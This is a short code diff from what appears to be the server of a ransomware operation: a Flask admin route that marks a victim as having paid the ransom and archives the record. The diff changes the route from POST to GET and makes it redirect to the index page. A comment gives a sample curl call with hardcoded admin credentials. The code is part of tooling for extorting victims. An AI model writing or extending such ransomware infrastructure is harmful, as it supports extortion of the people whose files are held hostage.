@@ -70,15 +70,14 @@ def checkStatus(victim_id):
 
 # When called, the specific victim has payed it's ransom and can be set as so in the DB
 # ex: curl -i -X POST http://rnsm-admin:rnsm@localhost:5000/paymentReceived/261153847923
-@app.route("/paymentReceived/<int:victim_id>", methods=["POST"])
+@app.route("/paymentReceived/<int:victim_id>", methods=["GET"])
 @auth.login_required
 def receivePayment(victim_id):
     victim = Victim.query.get(victim_id)
     victim.payment_received = True
     victim.archived = True
     db.session.commit()
-    response = make_response(render_template("404.html"), 404)
-    return response
+    return redirect(url_for("displayIndex"))
 
 
 # @app.route("/alloys")
